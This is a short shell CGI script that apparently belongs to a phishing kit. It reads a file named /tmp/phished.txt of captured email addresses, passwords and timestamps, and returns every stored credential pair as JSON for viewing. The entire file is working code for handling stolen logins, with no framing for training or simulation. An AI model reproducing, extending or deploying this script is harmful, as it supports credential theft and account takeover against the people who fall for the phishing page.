#!/bin/sh

LOG_FILE="/tmp/phished.txt"

echo "Content-type: application/json"
echo ""

# Check if log file exists
if [ ! -f "$LOG_FILE" ]; then
  echo "[]"
  exit 0
fi

echo "["

first=true
while IFS= read -r line || [ -n "$line" ]; do
  [ -z "$line" ] && continue

  email=$(echo "$line" | awk -F ' \\| ' '{print $1}' | sed 's/^Email: //')
  password=$(echo "$line" | awk -F ' \\| ' '{print $2}' | sed 's/^Password: //')
  timestamp=$(echo "$line" | awk -F ' \\| ' '{print $3}' | sed 's/^Timestamp: //')

  # Escape quotes
  email=$(echo "$email" | sed 's/"/\\"/g')
  password=$(echo "$password" | sed 's/"/\\"/g')
  timestamp=$(echo "$timestamp" | sed 's/"/\\"/g')

  # Generate a URL-safe ID using email+timestamp
  raw_id="${email}_${timestamp}"
  id=$(echo "$raw_id" | sed 's/ /%20/g' | sed 's/:/%3A/g')

  if [ "$first" = true ]; then
    first=false
  else
    echo ","
  fi

  printf '{"id": "%s", "email": "%s", "password": "%s", "timestamp": "%s"}' "$id" "$email" "$password" "$timestamp"
done < "$LOG_FILE"

echo ""
echo "]"

exit 0
